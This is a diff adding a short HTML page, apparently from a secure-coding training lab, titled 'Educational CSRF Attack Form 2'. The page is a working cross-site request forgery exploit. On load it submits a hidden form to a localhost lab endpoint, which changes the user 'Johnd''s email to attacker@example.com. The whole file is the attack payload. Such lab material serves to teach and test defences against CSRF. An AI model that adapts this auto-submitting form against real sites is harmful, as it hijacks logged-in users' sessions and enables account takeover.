@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <h2>Educational CSRF Attack Form 2</h2>
+    <form method="post" action="http://localhost/training-secure-coding/pages/csrf/lab-2/" id="csrfForm">
+        <input type="hidden" name="username" value="Johnd">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+  </body>
+</html>
